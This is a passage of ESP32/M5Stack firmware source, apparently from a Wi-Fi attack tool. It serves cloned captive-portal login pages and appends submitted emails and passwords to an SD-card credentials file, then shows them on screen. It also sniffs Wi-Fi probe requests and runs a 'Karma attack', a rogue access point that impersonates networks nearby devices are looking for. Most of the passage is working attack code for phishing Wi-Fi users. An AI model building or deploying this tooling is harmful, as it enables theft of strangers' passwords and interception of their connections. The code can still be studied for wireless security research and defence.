      if (SD.exists(fileName)) {
          if (SD.remove(fileName)) {
              server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
              Serial.println("-------------------");
              Serial.println("File deleted successfully");
              Serial.println("-------------------");
          } else {
              server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
              Serial.println("-------------------");
              Serial.println("File could not be deleted");
              Serial.println("-------------------");
          }
      } else {
          server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
          Serial.println("-------------------");
          Serial.println("File not found");
          Serial.println("-------------------");
      }
  }
  
  void servePortalFile(const String& filename) {
      
      File webFile = SD.open(filename);
      if (webFile) {
          server.streamFile(webFile, "text/html");
          /*Serial.println("-------------------");
          Serial.println("serve portal.");
          Serial.println("-------------------");*/
          webFile.close();
      } else {
          server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      }
  }
  
  void saveCredentials(const String& email, const String& password) {
      File file = SD.open("/credentials.txt", FILE_APPEND);
      if (file) {
          file.println("Email:" + email);
          file.println("Password:" + password);
          file.println("----------------------");
          file.close();
          Serial.println("-------------------");
          Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
          Serial.println("-------------------");
      } else {
          Serial.println("Error opening file for writing");
      }
  }
  void stopCaptivePortal() {
    dnsServer.stop();
    server.stop();
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAPdisconnect(true);
    isCaptivePortalOn = false;
    Serial.println("-------------------");
    Serial.println("Portal Stopped");
    Serial.println("-------------------");
    waitAndReturnToMenu("  Portal Stopped");
  }
  
  void listPortalFiles() {
      File root = SD.open("/sites");
      numPortalFiles = 0;
      while (File file = root.openNextFile()) {
          if (!file.isDirectory()) {
              String fileName = file.name();
              if (fileName.endsWith(".html")) {
                  portalFiles[numPortalFiles++] = String("/sites/") + fileName;
                  if (numPortalFiles >= 30) break;
              }
          }
          file.close();
      }
      root.close();
  }


void serveChangePasswordPage() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
        return;
    }

    String html = "<html><head><style>";
    html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
    html += "form { background-color: #444; padding: 20px; border-radius: 8px; display: inline-block; }";
    html += "input[type='password'], input[type='submit'] { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }";
    html += "input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; }";
    html += "input[type='submit']:hover { background-color: #005F73; }";
    html += "</style></head><body>";
    html += "<form action='/Change-Portal-Password-demand' method='get'>";
    html += "<input type='hidden' name='pass' value='" + password + "'>";
    html += "<h2>Change Portal Password</h2>";
    html += "New Password: <br><input type='password' name='newPassword'><br>";
    html += "<input type='submit' value='Change Password'>";
    html += "</form><br>Leave empty for an open AP.<br>Remember to deploy the portal again after changing the password.<br></body></html>";
    server.send(200, "text/html", html);
}



void handleChangePassword() {
    server.on("/Change-Portal-Password-demand", HTTP_GET, []() {
        String password = server.arg("pass");
        if (password != accessWebPassword) {
            server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            return;
        }
        
        String newPassword = server.arg("newPassword");
        captivePortalPassword = newPassword;
        server.send(200, "text/html", "<html><body><p>Password Changed Successfully !!</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    });

    serveChangePasswordPage();
}

  
  
  void changePortal() {
      listPortalFiles();
      const int listDisplayLimit = M5.Display.height() / 18;
      bool needDisplayUpdate = true;
  
      while (!inMenu) {
          if (needDisplayUpdate) {
              int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));
  
              M5.Display.clear();
              M5.Display.setTextSize(2);
              M5.Display.setTextColor(TFT_WHITE);
              M5.Display.setCursor(10, 10);
  
              for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
                  if (i == portalFileIndex) {
                      M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
                      M5.Display.setTextColor(TFT_GREEN);
                  } else {
                      M5.Display.setTextColor(TFT_WHITE);
                  }
                  M5.Display.setCursor(10, (i - listStartIndex) * 18);
                  M5.Display.println(portalFiles[i].substring(7));
              }
              M5.Display.display();
              needDisplayUpdate = false;
          }
  
          M5.update();
          if (M5.BtnA.wasPressed()) {
              portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
              needDisplayUpdate = true;
          } else if (M5.BtnC.wasPressed()) {
              portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
              needDisplayUpdate = true;
          } else if (M5.BtnB.wasPressed()) {
              selectedPortalFile = portalFiles[portalFileIndex];
              inMenu = true;
              Serial.println("-------------------");
              Serial.println(selectedPortalFile.substring(7) + " portal selected.");
              Serial.println("-------------------");
              waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
          }
      }
  }
  
  
  
  String credentialsList[100]; // max 100 lignes parsed
  int numCredentials = 0; 
  
  void readCredentialsFromFile() {
      File file = SD.open("/credentials.txt");
      if (file) {
          numCredentials = 0;
          while (file.available() && numCredentials < 100) {
              credentialsList[numCredentials++] = file.readStringUntil('\n');
          }
          file.close();
      } else {
          Serial.println("Error opening file");
      }
  }
  
  void checkCredentials() {
      readCredentialsFromFile();
      if (numCredentials == 0) {
          Serial.println("-------------------");
          Serial.println("No credentials...");
          Serial.println("-------------------");
          waitAndReturnToMenu(" No credentials...");
      } else {
          const int lineHeight = 18; 
          const int maxLineLength = M5.Display.width() / 13; 
          const int listDisplayLimit = M5.Display.height() / lineHeight - 2;
  
          int totalLines = 0;
          int listStartIndex = 0;
          for (int i = 0; i < numCredentials; i++) {
              int linesNeeded = (credentialsList[i].length() + maxLineLength - 1) / maxLineLength;
              if (i < currentListIndex) {
                  listStartIndex += linesNeeded;
              }
              totalLines += linesNeeded;
          }
  
          int listEndIndex = min(totalLines, listStartIndex + listDisplayLimit);
          M5.Display.clear();
          M5.Display.setTextSize(2);
  
          int displayY = 25;
          int currentLine = 0;
          for (int i = 0; i < numCredentials; i++) {
              String credential = credentialsList[i];
              int credentialLength = credential.length();
              int linesNeeded = (credentialLength + maxLineLength - 1) / maxLineLength;
  
              for (int line = 0; line < linesNeeded; line++) {
                  if (currentLine >= listStartIndex && currentLine < listEndIndex) {
                      int startIndex = line * maxLineLength;
                      int endIndex = min(startIndex + maxLineLength, credentialLength);
                      String part = credential.substring(startIndex, endIndex);
  
                      if (i == currentListIndex) {
                          M5.Display.fillRect(0, displayY, M5.Display.width(), lineHeight, TFT_NAVY);
                          M5.Display.setTextColor(TFT_GREEN);
                      } else {
                          M5.Display.setTextColor(TFT_WHITE);
                      }
  
                      M5.Display.setCursor(10, displayY);
                      M5.Display.println(part);
                      displayY += lineHeight;
                  }
                  currentLine++;
              }
              if (currentLine >= listEndIndex) break;
          }
          M5.Display.display();
  
          while (!inMenu) {
              M5.update();
              if (M5.BtnA.wasPressed()) {
                  currentListIndex = max(0, currentListIndex - 1);
                  checkCredentials();
              } else if (M5.BtnC.wasPressed()) {
                  currentListIndex = min(numCredentials - 1, currentListIndex + 1);
                  checkCredentials();
              } else if (M5.BtnB.wasPressed()) {
                  inMenu = true;
                  drawMenu(); 
              }
          }
      }
  }
  
  bool confirmPopup(String message) {
    bool confirm = false;
    bool decisionMade = false;
    
    M5.Display.clear();
    M5.Display.setCursor(50, M5.Display.height()/2);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.println(message);
    M5.Display.setCursor(37, 220);
    M5.Display.setTextColor(TFT_GREEN);
    M5.Display.println("Yes");
    M5.Display.setTextColor(TFT_RED);
    M5.Display.setCursor(254, 220);
    M5.Display.println("No");
    M5.Display.setTextColor(TFT_WHITE);
  
    while (!decisionMade) {
      M5.update();
      if (M5.BtnA.wasPressed()) {
        confirm = true;
        decisionMade = true;
      }
      if (M5.BtnC.wasPressed()) {
        confirm = false;
        decisionMade = true;
      }
    }
  
    return confirm;
  }
  
  void deleteCredentials() {
      if (confirmPopup("Delete credentials?")) {
          File file = SD.open("/credentials.txt", FILE_WRITE);
          if (file) {
              file.close();
              Serial.println("-------------------");
              Serial.println("credentials.txt deleted");
              Serial.println("-------------------");
              waitAndReturnToMenu("Deleted successfully");
              Serial.println("Credentials deleted successfully");
          } else {
               Serial.println("-------------------");
              Serial.println("Error deleteting credentials.txt ");
              Serial.println("-------------------");
              waitAndReturnToMenu("Error..");
              Serial.println("Error opening file for deletion");
          }
      } else {
          waitAndReturnToMenu("Deletion cancelled");
      }
  }
  
  
  int countPasswordsInFile() {
      File file = SD.open("/credentials.txt");
      if (!file) {
          Serial.println("Error opening credentials file for reading");
          return 0;
      }
  
      int passwordCount = 0;
      while (file.available()) {
          String line = file.readStringUntil('\n');
          if (line.startsWith("Password:")) {
              passwordCount++;
          }
      }
  
      file.close();
      return passwordCount;
  }
  
  void displayMonitorPage1() {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      M5.Display.setTextColor(TFT_WHITE);
      M5.Display.setCursor(10, 30);
      M5.Display.println("Clients: " + String(WiFi.softAPgetStationNum()));
      M5.Display.setCursor(10, 60);
      M5.Display.println("Passwords: " + String(countPasswordsInFile()));
      M5.Display.setCursor(10, 90);
      M5.Display.println("SSID: " + clonedSSID);
      M5.Display.setCursor(10, 120);
      M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
      M5.Display.setCursor(10, 150);
      M5.Display.println("Page: " + selectedPortalFile.substring(7));

      Serial.println("-------------------");
      Serial.println("Clients: " + String(WiFi.softAPgetStationNum()));
      Serial.println("Passwords: " + String(countPasswordsInFile()));
      Serial.println("SSID: " + clonedSSID);
      Serial.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
      Serial.println("Page: " + selectedPortalFile.substring(7));
      Serial.println("-------------------");

      

      
      M5.Display.display();
  
      while (!inMenu) {
          M5.update();
  
          if (M5.BtnA.wasPressed()) {
              displayMonitorPage3();
              break;
          } else if (M5.BtnC.wasPressed()) {
              displayMonitorPage2();
              break;
          } else if (M5.BtnB.wasPressed()) {
              inMenu = true; 
              drawMenu();
              break;
          }
      }
  }
  
  void updateConnectedMACs() {
      wifi_sta_list_t stationList;
      tcpip_adapter_sta_list_t adapterList;
      esp_wifi_ap_get_sta_list(&stationList);
      tcpip_adapter_get_sta_list(&stationList, &adapterList);
  
      for (int i = 0; i < adapterList.num; i++) {
          char macStr[18];
          snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                   adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
                   adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
          macAddresses[i] = String(macStr);
      }
  }
  
  void displayMonitorPage2() {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      updateConnectedMACs();
      if (macAddresses[0] == "") { 
          M5.Display.setCursor(10, 30);
          M5.Display.println("No client connected");
          Serial.println("----Mac-Address----");
          Serial.println("No client connected");
          Serial.println("-------------------");
      } else {
      Serial.println("----Mac-Address----");
      for (int i = 0; i < 10; i++) {
          int y = 30 + i * 20; 
          if (y > M5.Display.height() - 20) break; 
  
          M5.Display.setCursor(10, y);
          M5.Display.println(macAddresses[i]);
          Serial.println(macAddresses[i]);
      }
      Serial.println("-------------------");
      }
      
  
      M5.Display.display();
  
      while (!inMenu) {
          M5.update();
  
          if (M5.BtnA.wasPressed()) {
              displayMonitorPage1(); 
              break;
          } else if (M5.BtnC.wasPressed()) {
              displayMonitorPage3(); 
              break;
          } else if (M5.BtnB.wasPressed()) {
              inMenu = true; 
              drawMenu();
              break;
          }
      }
      }
  
  void displayMonitorPage3() {
      M5.Display.clear();
      M5.Display.setTextSize(2);
  
      M5.Display.setCursor(10, 30);
      M5.Display.println("Stack left: " + String(getStack()) + " Kb");
  
      M5.Display.setCursor(10, 60);
      M5.Display.println("RAM: " + String(getRamUsage()) + " Mo");
  
      M5.Display.setCursor(10, 90);
      M5.Display.println("Batterie: " + String(getBatteryLevel()) + "%");
  
      M5.Display.setCursor(10, 120);
      M5.Display.println("Temperature: " + String(getTemperature()) + " C");



      Serial.println("-------------------");
      Serial.println("Stack left: " + String(getStack()) + " Kb");
      Serial.println("RAM: " + String(getRamUsage()) + " Mo");
      Serial.println("Batterie: " + String(getBatteryLevel()) + "%");
      Serial.println("Temperature: " + String(getTemperature()) + " C");
      Serial.println("-------------------");
      
      M5.Display.display();
  
      while (!inMenu) {
          M5.update();
  
          if (M5.BtnA.wasPressed()) {
              displayMonitorPage2();
              break;
          } else if (M5.BtnC.wasPressed()) {
              displayMonitorPage1(); 
              break;
          } else if (M5.BtnB.wasPressed()) {
              inMenu = true; 
              drawMenu();
              break;
          }
      }
  }
  
  String getBatteryLevel() {
      return String(M5.Power.getBatteryLevel());
  }
  
  String getTemperature() {
      float temperature;
      M5.Imu.getTemp(&temperature);
      return String(temperature);
  }
  
  String getStack() {
      UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
      return String(stackWordsRemaining * 4 / 1024.0);
  }
         
  
  String getRamUsage() {
      float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0; 
      char buffer[10]; 
      sprintf(buffer, "%.2f", heapSizeInMegabytes);
      return String(buffer);
  }
  
  void probeSniffing() {
      isProbeSniffingMode = true; 
      startScanKarma();
  
      while (true) {
          M5.update();
          if (M5.BtnB.wasPressed()) {
              stopScanKarma(); 
              break;
          }
      }
  
      isProbeSniffingMode = false; 
  }
  
  
  
  void karmaAttack() {
      drawStartButtonKarma();
  }
  
  void waitAndReturnToMenu(String message) {
    M5.Display.clear();
    M5.Display.setTextSize(2);
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
    M5.Display.setCursor(50 , M5.Display.height()/ 2 );
    M5.Display.println(message);
    M5.Display.display();
    delay(1000);
    inMenu = true;
    drawMenu();  
  } 
  
  
  void brightness() {
      int currentBrightness = M5.Display.getBrightness(); 
      int minBrightness = 1; 
      int maxBrightness = 255;
  
      M5.Display.clear();
      M5.Display.setTextSize(2);
      M5.Display.setTextColor(TFT_WHITE);
  
      bool brightnessAdjusted = true; 
  
      while (true) {
          M5.update();
  
          if (M5.BtnA.wasPressed()) {
              currentBrightness = max(minBrightness, currentBrightness - 12);
              brightnessAdjusted = true;
          } else if (M5.BtnC.wasPressed()) {
              currentBrightness = min(maxBrightness, currentBrightness + 12);
              brightnessAdjusted = true;
          } else if (M5.BtnB.wasPressed()) {
              break; 
          }
  
          if (brightnessAdjusted) {
              float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
              M5.Display.fillScreen(TFT_BLACK);
              M5.Display.setCursor(10, M5.Display.height() / 2 - 10);
              M5.Display.print("     Brightness: ");
              M5.Display.print((int)brightnessPercentage);
              M5.Display.println("%");
              M5.Display.setBrightness(currentBrightness);
              M5.Display.display();
              brightnessAdjusted = false;
          }
      }
  
      float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
      waitAndReturnToMenu("Brightness set to " + String((int)finalBrightnessPercentage) + "%");
  }
  
  
  
  
  
  //KARMA-PART-FUNCTIONS
  
  void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
      if (!isScanningKarma || type != WIFI_PKT_MGMT) return;
  
      const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
      const uint8_t *frame = packet->payload;
      const uint8_t frame_type = frame[0];
  
      if (ssid_count_Karma == 0) {
          M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
          M5.Display.println("Waiting for probe...");
      }
  
      if (frame_type == 0x40) { // Probe Request Frame
          uint8_t ssid_length_Karma = frame[25];
          if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
              char ssidKarma[33] = {0};
              memcpy(ssidKarma, &frame[26], ssid_length_Karma);
              ssidKarma[ssid_length_Karma] = '\0';
              if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
                  return;
              }
  
              bool ssidExistsKarma = false;
              for (int i = 0; i < ssid_count_Karma; i++) {
                  if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
                      ssidExistsKarma = true;
                      break;
                  }
              }
              if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
                  strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
                  updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
                  Serial.print("Found: ");
                  Serial.println(ssidKarma);
              }
          }
      }
  }
  
  void saveSSIDToFile(const char* ssid) {
      bool ssidExists = false;
      File readfile = SD.open("/probes.txt", FILE_READ);
      if (readfile) {
          while (readfile.available()) {
              String line = readfile.readStringUntil('\n');
              if (line.equals(ssid)) {
                  ssidExists = true;
                  break;
              }
          }
          readfile.close();
      }
      if (!ssidExists) {
          File file = SD.open("/probes.txt", FILE_APPEND);
          if (file) {
              file.println(ssid);
              file.close();
          } else {
              Serial.println("Error opening probes.txt");
          }
      }
  }
  
    
  void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
      const int maxLength = 22; 
      char truncatedSSID[23]; 
  
      M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 60, TFT_BLACK);
      int startIndexKarma = max(0, count - maxMenuDisplayKarma);
  
      for (int i = startIndexKarma; i < count; i++) {
          int lineIndexKarma = i - startIndexKarma;
          M5.Display.setCursor(0, lineIndexKarma * 20);
  
          if (strlen(ssidsKarma[i]) > maxLength) {
              strncpy(truncatedSSID, ssidsKarma[i], maxLength);
              truncatedSSID[maxLength] = '\0'; 
              M5.Display.printf("%d.%s", i + 1, truncatedSSID);
          } else {
              M5.Display.printf("%d.%s", i + 1, ssidsKarma[i]);
          }
      }
     if ( count <= 9){
      M5.Display.fillRect(M5.Display.width() - 15, 0, 15, 20, TFT_DARKGREEN);
      M5.Display.setCursor(M5.Display.width() - 13, 3);
     }else if ( count >= 10 && count <= 99){
      M5.Display.fillRect(M5.Display.width() - 30, 0, 30, 20, TFT_DARKGREEN);
      M5.Display.setCursor(M5.Display.width() - 27, 3);
     }else if ( count >= 100 && count < MAX_SSIDS_Karma*0.7){
      M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_ORANGE);
       M5.Display.setTextColor(TFT_BLACK);
      M5.Display.setCursor(M5.Display.width() - 42, 3);
       M5.Display.setTextColor(TFT_WHITE);
     }else{
      M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_RED);
      M5.Display.setCursor(M5.Display.width() - 42, 3);
      }
      if (count == MAX_SSIDS_Karma){
      M5.Display.printf("MAX");
      }else{
      M5.Display.printf("%d", count);
        }
      M5.Display.display();
  }
  
  
  void drawStartButtonKarma() {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_GREEN);
    M5.Display.setCursor(100, M5.Display.height() - 40);
    M5.Display.setTextColor(TFT_BLACK);
    M5.Display.println("Start Sniff");
    M5.Display.setTextColor(TFT_WHITE);
  }
  
  void drawStopButtonKarma() {
    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(100, M5.Display.height() - 40);
    M5.Display.println("Stop Sniff");
    M5.Display.setTextColor(TFT_WHITE);
  }
  
  void startScanKarma() {
    isScanningKarma = true;
    ssid_count_Karma = 0;
    M5.Display.clear();
    drawStopButtonKarma();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);
    Serial.println("-------------------");
    Serial.println("Probe Sniffing Started...");
    Serial.println("-------------------");

  }
  
  void stopScanKarma() {
      Serial.println("-------------------");
      Serial.println("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
      Serial.println("-------------------");
      isScanningKarma = false;
      esp_wifi_set_promiscuous(false);
      
      if (isProbeSniffingMode) {
        bool saveSSID = false;
        if (ssid_count_Karma > 0){
          saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
        }
        M5.Display.clear();
          M5.Display.setCursor(50 , M5.Display.height()/ 2 );
          if (saveSSID) {
              M5.Display.println("Saving SSIDs on SD..");
              for (int i = 0; i < ssid_count_Karma; i++) {
                  saveSSIDToFile(ssidsKarma[i]);
              }
              
              M5.Display.clear();
              M5.Display.setCursor(50 , M5.Display.height()/ 2 );
              M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
              Serial.println("-------------------");
              Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
              Serial.println("-------------------");
              
          } else {
              M5.Display.println("  No SSID saved.");
          }
      delay(1000);
      memset(ssidsKarma, 0, sizeof(ssidsKarma));
      ssid_count_Karma = 0;
      }
  
      menuSizeKarma = ssid_count_Karma;
      currentIndexKarma = 0;
      menuStartIndexKarma = 0;
  
      if (ssid_count_Karma > 0) {
          drawMenuKarma();
          currentStateKarma = StopScanKarma;
      } else {
          currentStateKarma = StartScanKarma;
          inMenu = true;
          drawMenu();
      }
  
      isProbeSniffingMode = false; 
  }
  
  
  void handleMenuInputKarma() {
      bool stateChanged = false;
  
      if (M5.BtnA.wasPressed()) {
          currentIndexKarma--;
          if (currentIndexKarma < 0) {
              currentIndexKarma = menuSizeKarma - 1;
          }
          stateChanged = true;
      } else if (M5.BtnC.wasPressed()) {
          currentIndexKarma++;
          if (currentIndexKarma >= menuSizeKarma) {
              currentIndexKarma = 0;
          }
          stateChanged = true;
      }
  
      if (stateChanged) {
          menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
      }
  
      if (M5.BtnB.wasPressed()) {
          executeMenuItemKarma(currentIndexKarma);
          stateChanged = true; 
      }
      if (stateChanged) {
          drawMenuKarma(); 
      }
  }
  
  
  void drawMenuKarma() {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      M5.Display.setTextFont(1);
  
      int lineHeight = 24;
      int startX = 10;
      int startY = 25;
  
      for (int i = 0; i < maxMenuDisplayKarma; i++) {
          int menuIndexKarma = menuStartIndexKarma + i;
          if (menuIndexKarma >= menuSizeKarma) break;
  
          if (menuIndexKarma == currentIndexKarma) {
              M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
              M5.Display.setTextColor(TFT_GREEN);
          } else {
              M5.Display.setTextColor(TFT_WHITE);
          }
          M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
          M5.Display.println(ssidsKarma[menuIndexKarma]);
      }
      M5.Display.display();
  }
  
  void executeMenuItemKarma(int indexKarma) {
      if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
          startAPWithSSIDKarma(ssidsKarma[indexKarma]);
      } else {
          M5.Display.clear();
          M5.Display.println("Selection invalide!");
          delay(1000);
          drawStartButtonKarma();
          currentStateKarma = StartScanKarma;
      }
  }
  
  void startAPWithSSIDKarma(const char* ssid) {
    clonedSSID = String(ssid);
    createCaptivePortal();
    
    Serial.println("-------------------");
    Serial.println("Karma Attack started for : " + String(ssid));
    Serial.println("-------------------");
  
    M5.Display.clear();
    unsigned long startTime = millis();
    unsigned long currentTime;
    int remainingTime;
    int clientCount = 0;
    int scanTimeKarma = 60; // Scan time for karma attack
    
   while (true) {
          M5.update(); 
  
          currentTime = millis();
          remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
          clientCount = WiFi.softAPgetStationNum();
  
          M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50); 
          M5.Display.println(String(ssid));
          
          int textWidth = 12 * 16; 
          M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 90, textWidth, 20, TFT_BLACK);
          M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 90);
          M5.Display.print("Left Time: ");
          M5.Display.print(remainingTime);
          M5.Display.println(" s");
  
          textWidth = 12 * 20; 
          M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 130, textWidth, 20, TFT_BLACK);
          M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 130);
          M5.Display.print("Connected Client: ");
          M5.Display.println(clientCount);

          Serial.println("---Karma-Attack---");
          Serial.println("On :" + String(ssid));
          Serial.println("Left Time: " + String(remainingTime) + "s");
          Serial.println("Connected Client: "+ String(clientCount));
          Serial.println("-------------------");

          
         M5.Display.setCursor(130, 220);
         M5.Display.println(" Stop");
              M5.Display.display();
      
              if (remainingTime <= 0) {
                  break;
              }
              if (M5.BtnB.wasPressed()) {
                  break;
              }else {
                delay(200);
              }
      
          }
    M5.Display.clear();
    M5.Display.setCursor(50 , M5.Display.height()/ 2 );
    if (clientCount > 0) {
        M5.Display.println("Karma Successful!!!");
        Serial.println("-------------------");
        Serial.println("Karma Attack worked !");
        Serial.println("-------------------");
    }else {
        M5.Display.println(" Karma Failed...");
        Serial.println("-------------------");
        Serial.println("Karma Attack failed...");
        Serial.println("-------------------");
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);
      }
      delay(2000);
    if (confirmPopup("Save " + String(ssid) + " ?" )) {
    saveSSIDToFile(ssid);
    }
    lastIndex = -1;
    inMenu = true;  
    currentStateKarma = StartScanKarma;
    memset(ssidsKarma, 0, sizeof(ssidsKarma)); 
    ssid_count_Karma = 0;
    drawMenu();  
  }
  
  
  
  void listProbes() {
      File file = SD.open("/probes.txt", FILE_READ);
      if (!file) {
          Serial.println("Failed to open probes.txt");
          waitAndReturnToMenu("Failed to open probes.txt");
          return;
      }
  
      String probes[MAX_SSIDS_Karma];
      int numProbes = 0;
  
      while (file.available() && numProbes < MAX_SSIDS_Karma) {
          String line = file.readStringUntil('\n');
          line.trim();
          if (line.length() > 0 && !isProbePresent(probes, numProbes, line)) {
              probes[numProbes++] = line;

          }
      }
      file.close();
      if (numProbes == 0) {
          Serial.println("-------------------");
          Serial.println(" No probes found");
          Serial.println("-------------------");
          waitAndReturnToMenu(" No probes found");
          return;
      }
  
      const int maxDisplay = 11;
      const int maxSSIDLength = 23; // Adjust based on your display width
      int currentListIndex = 0;
      int listStartIndex = 0;
      int selectedIndex = -1;
      bool needDisplayUpdate = true;
  
      while (selectedIndex == -1) {
          M5.update();
  
          bool indexChanged = false;
          if (M5.BtnA.wasPressed()) {
              currentListIndex--;
              if (currentListIndex < 0) currentListIndex = numProbes - 1;
              indexChanged = true;
          } else if (M5.BtnC.wasPressed()) {
              currentListIndex++;
              if (currentListIndex >= numProbes) currentListIndex = 0;
              indexChanged = true;
          } else if (M5.BtnB.wasPressed()) {
              selectedIndex = currentListIndex;
          }
  
          if (indexChanged) {
              listStartIndex = max(0, min(currentListIndex, numProbes - maxDisplay));
              needDisplayUpdate = true;
          }
  
          if (needDisplayUpdate) {
              M5.Display.clear();
              M5.Display.setTextSize(2);
              int y = 10;
  
              for (int i = 0; i < maxDisplay; i++) {
                  int probeIndex = listStartIndex + i;
                  if (probeIndex >= numProbes) break;
  
                  String ssid = probes[probeIndex];
                  if (ssid.length() > maxSSIDLength) {
                      ssid = ssid.substring(0, maxSSIDLength) + "..";
                  }
  
                  M5.Display.setCursor(10, y);
                  M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
                  M5.Display.println(ssid);
                  y += 20;
              }
  
              M5.Display.display();
              needDisplayUpdate = false;
          }
      }
      Serial.println("-------------------");
      Serial.println("SSID selected: " + probes[selectedIndex]);
      Serial.println("-------------------");
      clonedSSID = probes[selectedIndex];
      waitAndReturnToMenu(probes[selectedIndex] + " selected");
  }
  
  
  
  bool isProbePresent(String probes[], int numProbes, String probe) {
      for (int i = 0; i < numProbes; i++) {
          if (probes[i] == probe) {
              return true;
          }
      }
      return false;
  }
  
  
  
void deleteProbe() {
    File file = SD.open("/probes.txt", FILE_READ);
    if (!file) {
        Serial.println("-------------------");
        Serial.println("Failed to open probes.txt");
        Serial.println("-------------------");
        waitAndReturnToMenu("Failed to open probes.txt");
        return;
    }

    String probes[MAX_SSIDS_Karma];
    int numProbes = 0;

    while (file.available() && numProbes < MAX_SSIDS_Karma) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) {
            probes[numProbes++] = line;
        }
    }
    file.close();

    if (numProbes == 0) {
        waitAndReturnToMenu("No probes found");
        return;
    }

    const int maxSSIDLength = 23; // Adjust based on your display width
    const int maxDisplay = 11;
    int currentListIndex = 0;
    int listStartIndex = 0;
    int selectedIndex = -1;
    bool needDisplayUpdate = true;

    while (selectedIndex == -1) {
        M5.update();

        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setTextSize(2);

            for (int i = 0; i < maxDisplay; i++) {
                int probeIndex = listStartIndex + i;
                if (probeIndex >= numProbes) break;

                String ssid = probes[probeIndex];
                if (ssid.length() > maxSSIDLength) {
                    ssid = ssid.substring(0, maxSSIDLength) + "..";
                }

                M5.Display.setCursor(10, i * 20 + 10);
                M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
                M5.Display.println(ssid);
            }

            M5.Display.display();
            needDisplayUpdate = false;
        }

        if (M5.BtnA.wasPressed()) {
            currentListIndex--;
            if (currentListIndex < 0) currentListIndex = numProbes - 1;
            needDisplayUpdate = true;
        } else if (M5.BtnC.wasPressed()) {
            currentListIndex++;
            if (currentListIndex >= numProbes) currentListIndex = 0;
            needDisplayUpdate = true;
        } else if (M5.BtnB.wasPressed()) {
